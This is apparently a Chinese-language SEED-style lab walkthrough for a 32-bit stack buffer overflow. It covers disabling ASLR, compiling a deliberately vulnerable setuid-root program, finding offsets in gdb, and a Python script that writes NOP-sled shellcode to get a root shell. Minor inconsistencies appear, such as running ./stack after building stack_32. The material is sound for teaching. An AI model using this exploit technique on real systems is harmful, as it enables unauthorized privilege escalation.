# 栈的缓冲区溢出攻击

## 1. 关闭地址空间随机化

这一步是为了获取固定的栈地址，方便后续的攻击。

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

## 2. 准备有漏洞的程序

```c
// stack.c

#include "stdio.h"
#include "stdlib.h"
#include "string.h"

int foo(char *str) {
    char buffer[100];

	strcpy(buffer, str);
	return 1;
} 

int main(int argc, char **argv) {
	char str[400];
	FILE *badfile;

	badfile = fopen("badfile", "r");
	fread(str, sizeof(char), 300, badfile);
	foo(str);

	printf("Returned Properly\n");
	return 1;
}
```

对其进行编译，并设置为setuid程序：

```bash
# 使gcc支持32位编译
sudo apt-get install gcc-multilib
# 编译stack程序(默认为64位)，编译32位需加-m32
gcc -o stack_32 -m32 -z execstack -fno-stack-protector stack.c
sudo chown root stack_32
sudo chmod 4755 stack_32
```

其中，`-z execstack`设置栈为可执行，`-fno-stack-protector`关闭StackGuard机制。

## 3. 通过调试寻找注入地址

```bash
# 创建badfile（badfile不存在会导致segmentation fault）
touch badfile
# 为了方便调试时断点设置，编译一个含有符号信息的stack
gcc -g -o stack_32_dbg -z execstack -fno-stack-protector stack.c
# 使用gdb进行调试
gdb stack_32_dbg
# 对foo函数设置断点
b foo
# 运行程序，程序会在断点处停止
r
# 打印ebp寄存器和buffer变量的地址，并计算差值
p $ebp
p &buffer
```

注意：
1. 对于`stack_32`，帧指针为`$ebp`；对于`stack_64`，帧指针为`$rbp`。
2. **在SEED VM更新为Ubuntu 20.04之后，上述gdb的调试行为发生了一些变动**。在以前的Ubuntu 16.04中，对`foo`函数下断点然后run，此时的`$ebp`就是`foo`函数的帧指针。但在Ubuntu 20.04中，此时的`$ebp`却还是`main`函数的帧指针，因而有以下两种方法获取正确的`foo`函数`$ebp`：

```bash
# 方法一：
# 仍然对foo函数下断点
b foo
# 运行程序
r
# next步过一次，或者stepi步进三条机器指令
next # stepi 几次取决于你在gdb的汇编code区域观察到 push ebp; mov ebp, esp; 执行完毕
# 此时打印ebp即为正确的foo帧指针地址
p $ebp
...

# 方法二：
# 对foo函数里的strcpy所在行下断点
b stack.c:10
# 运行程序
r
# 获取正确的foo帧指针地址
p $ebp
...
```

## 4. 生成badfile

```python
#!/usr/bin/python3

import sys

shellcode = (
	"\x31\xc0" 	# xorl %eax,%eax
	"\x50" 	   	# %eax
	"\x68""//sh"	# pushl $0x68732f2f
	"\x68""/bin"	# pushl $0x6e69622f
	"\x89\xe3"	# movl %esp,%ebx
	"\x50"		# pushl %eax
	"\x53"		# pushl %ebx
	"\x89\xe1"	# movl %esp,%ecx
	"\x99"		# cdq
	"\xb0\x0b"	# movb $0x0b,%al
	"\xcd\x80"	# int $0x80
).encode('latin-1')

# fill with nop
content = bytearray(0x90 for i in range(300))

# put the shellcode
start = 300 - len(shellcode)
content[start:] = shellcode

# set the entry point of the shellcode
ret = 0xffffcfe8 + 120
content[112:116] = (ret).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as wb:
	wb.write(content)
```

注意：
1. 上述代码中 `ret = 0xffffcfe8 + 120`的`0xffffcfe8`替换为你自己调试时的`p $ebp`值。
2. return address为`$ebp+4`，又因为是32位程序，所以return address对应`content[112:116]`（其中`112 = $ebp-&buffer + 4`）
3. 由于gdb可能会在调试过程中向栈中push一些其他的数据从而导致`$ebp`位于更深的位置，即在实际执行`stack`程序时，`$ebp`的地址可能要高于我们在gdb中看到的值，所以`ret = $ebp + 8`可行（因为有NOP Sled存在）而`ret = $gdb_ebp + 8`不可行。因此我们一般取一个稍大的偏移值，比如`120`或`200`。大家也可以在执行失败时尝试不同的偏移值。但需要注意的是，`ret`地址中不能包含0，否则会导致`strcpy`读取到0之后提前返回，无法将后续的内容拷贝到`buffer`。

对上述文件增加执行权限后执行，生成badfile：

```bash
chmod u+x exploit.py
./exploit.py
```
这时生成了badfile。

## 5. 执行攻击

与之前实验类似，首先替换掉含有保护机制的shell。

```bash
sudo ln -sf /bin/zsh /bin/sh
```

执行漏洞程序获得root shell。

```bash
./stack
id
```

## 6. 思考

如何栈溢出攻击64位的stack程序呢？